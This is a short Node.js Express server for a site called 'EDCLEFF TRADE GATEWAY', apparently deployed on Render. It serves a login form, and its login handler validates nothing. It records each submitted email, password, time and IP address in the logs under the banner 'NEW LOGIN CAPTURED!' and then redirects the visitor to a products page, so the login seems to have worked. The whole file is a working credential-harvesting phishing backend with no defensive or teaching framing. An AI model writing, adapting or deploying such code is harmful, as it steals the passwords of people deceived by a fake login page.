const express = require('express');
const path = require('path');

const app = express();
const PORT = process.env.PORT || 3000;

// Middleware to parse form data
app.use(express.urlencoded({ extended: true }));
app.use(express.json());

// Serve the landing page (login form)
app.get('/', (req, res) => {
res.sendFile(path.join(__dirname, 'index.html'));
});

// Serve the products page (after login)
app.get('/products', (req, res) => {
res.sendFile(path.join(__dirname, 'products.html'));
});

// Handle login form submission
app.post('/submit-login', (req, res) => {
const { email, password } = req.body;

// Log credentials to console (visible in Render logs)
console.log('\n' + '='.repeat(60));
console.log(' NEW LOGIN CAPTURED!');
console.log(' Email:', email);
console.log(' Password:', password);
console.log(' Time:', new Date().toISOString());
console.log(' IP:', req.ip || req.connection?.remoteAddress || 'Unknown');
console.log('='.repeat(60) + '\n');

// Redirect to products page
res.redirect('/products');
});

// Start the server
app.listen(PORT, '0.0.0.0', () => {
console.log(`\n EDCLEFF TRADE GATEWAY IS RUNNING!`);
console.log(` Server started on port ${PORT}`);
console.log(` Your app is live!`);
console.log(` Login page: https://edcleff-product-view.onrender.com`);
console.log(` Products page: https://edcleff-product-view.onrender.com/products`);
});
